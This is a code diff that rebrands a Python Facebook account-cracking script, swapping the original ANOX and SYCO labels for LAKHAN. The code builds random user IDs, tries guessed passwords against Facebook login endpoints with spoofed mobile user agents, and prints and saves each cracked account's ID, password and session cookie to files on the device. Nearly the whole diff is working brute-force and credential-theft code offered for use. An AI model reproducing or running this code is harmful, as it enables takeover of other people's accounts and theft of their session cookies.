@@ -160,25 +160,29 @@ os.system("xdg-open ")
 #app  check 
 
 
-logo = ""QUESTI;32m      
+logo = """       
 
- /$$        /$$$$$$  /$$   /$$ /$$   /$$  /$$$$$$  /$$   /$$
-| $$       /$$__  $$| $$  /$$/| $$  | $$ /$$__  $$| $$$ | $$
-| $$      | $$  \ $$| $$ /$$/ | $$  | $$| $$  \ $$| $$$$| $$
-| $$      | $$$$$$$$| $$$$$/  | $$$$$$$$| $$$$$$$$| $$ $$ $$
-| $$      | $$__  $$| $$  $$  | $$__  $$| $$__  $$| $$  $$$$
-| $$      | $$  | $$| $$\  $$ | $$  | $$| $$  | $$| $$\  $$$
-| $$$$$$$$| $$  | $$| $$ \  $$| $$  | $$| $$  | $$| $$ \  $$
-|________/|__/  |__/|__/  \__/|__/  |__/|__/  |__/|__/  \__/
+
+    /$$        /$$$$$$  /$$   /$$ /$$   /$$  /$$$$$$  /$$   /$$
+   | $$       /$$__  $$| $$  /$$/| $$  | $$ /$$__  $$| $$$ | $$
+   | $$      | $$  \ $$| $$ /$$/ | $$  | $$| $$  \ $$| $$$$| $$
+   | $$      | $$$$$$$$| $$$$$/  | $$$$$$$$| $$$$$$$$| $$ $$ $$
+   | $$      | $$__  $$| $$  $$  | $$__  $$| $$__  $$| $$  $$$$
+   | $$      | $$  | $$| $$\  $$ | $$  | $$| $$  | $$| $$\  $$$
+   | $$$$$$$$| $$  | $$| $$ \  $$| $$  | $$| $$  | $$|  \  $$
+   |________/|__/  |__/|__/  \__/|__/  |__/|__/  |__/|__/  \__/
                                                             
-                                                                                                                        
+                                                            
+                                                            
+
+
 \033[1;31m☆《=============================================》☆
-\033[1;36m[<>] \033[1;34mCREATED BY   : » \033[1;34mOWNER LAKHAN
-\033[1;32m[<>] \033[1;36mFACEBOK      : » \033[1;36mLAKHAN120
-\033[1;37m[<>] \033[1;37mGITHUB       : » \033[1;37mLAKHAN320
-\033[1;33m[<>] \033[1;34mWHATSAPP     : » \033[1;34mOFFLINE
-\033[1;35m[<>] \033[1;36mLEGEND       : » LAKHAN xD
-\033[1;32m[<>] \033[1;33mVERSION      : » \033[1;33m2.1
+\033[1;36m[>] \033[1;34mCREATED BY   : » \033[1;34mOWNER LAKHAN
+\033[1;32m[>] \033[1;36mFACEBOK        : » \033[1;36m LAKHAN 
+\033[1;37m[>] \033[1;37mGITHUB          : » \033[1;37mLAKHAN
+\033[1;33m[>] \033[1;34mWHATSAPP   : » \033[1;34mOFFLINE
+\033[1;35m[>] \033[1;36mLEGEND        : » LAKHAN
+\033[1;32m[>] \033[1;33mVERSION      : » \033[1;33m2.1
 \033[1;31m《=============================================》☆\n\n"""  
 loop = 0
 oks = []
@@ -281,7 +285,7 @@ def random_number():
 			uid = kode+guru
 			mk = uid[:6]
 			pwx = [guru]
-			pwx = [kode+guru,mk,'57273200','59039200','free fire','57575751','57273200','freefire123']
+			pwx = [kode+guru,mk,'57273200']
 			yaari.submit(rcrack,uid,pwx,tl)
 	print(47*"-")
 	print('[✓] Crack process has been completed')
@@ -328,7 +332,7 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 30 Pro 5G Build/QP1A.191105.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0 Mobile Safari/90.0.4430.210 OPR/537.36',}
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; POT-AL00a Build/HUAWEIPOT-AL00a; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/273.0.0.39.123;]',}
 			lo = session.post('https://x.facebook.com/?stype=lo&jlou=AfeBh1P5XSlSM2wms2C4U9Hnl-2G6_2Hu6YuPY48KB5TIXB6DvoWscdFgWbOPrLKsVL0Kgk3OXFhVxwRM2moqOmStv3iCJMU3SWceuZ4YHNsxQ&smuh=1245&lh=Ac_u--FyoUL4CN2u9NE&wtsid',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 
@@ -340,7 +344,7 @@ def rcrack(uid,pwx,tl):
 
 				uid = coki[151:166]
 
-				print('\r\033[1;32m[ANOX_OK] '+uid+' | '+ps)
+				print('\r\033[1;32m[LAKHANOK] '+uid+' | '+ps)
 
 				print(f" Cookie : {coki}")
 
@@ -370,7 +374,7 @@ def rcrack(uid,pwx,tl):
 
 		loop+=1
 
-		sys.stdout.write('\r\33[1;37m[SYCO-xD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[LAKHAN-xD] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 
 		sys.stdout.flush()
 
@@ -450,7 +454,7 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; HUAWEI Mate 30 Pro 5G Build/QP1A.191105.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/15.0 Mobile Safari/90.0.4430.210 OPR/537.36',}
+    'user-agent': 'Mozilla/5.0 (Linux; U; Android 4.2.2; en-us; Galaxy Nexus Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',}
 			lo = session.post('https://x.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 
@@ -462,11 +466,11 @@ def rcrack(uid,pwx,tl):
 
 				uid = coki[151:166]
 
-				print('\r\033[1;32m[ANOX-OK] '+uid+' | '+ps)
+				print('\r\033[1;32m[LAKHAN-OK] '+uid+' | '+ps)
 
 				print(f" Cookie : {coki}")
 
-				open('/sdcard/anox-906-cookie.txt','a'). write(uid+'|'+ps+'|' +coki+'\n')
+				open('/sdcard/LAKHAN-cookie.txt','a'). write(uid+'|'+ps+'|' +coki+'\n')
 				open('ok.txt', 'a').write(uid+' | '+ps+'\n')
 
 				oks.append(uid)
@@ -493,7 +497,7 @@ def rcrack(uid,pwx,tl):
 
 		loop+=1
 
-		sys.stdout.write('\r\33[1;37m[RUNNING ANOX-🥰] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
+		sys.stdout.write('\r\33[1;37m[RUN LAKHAN -] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
 
 		sys.stdout.flush()
 
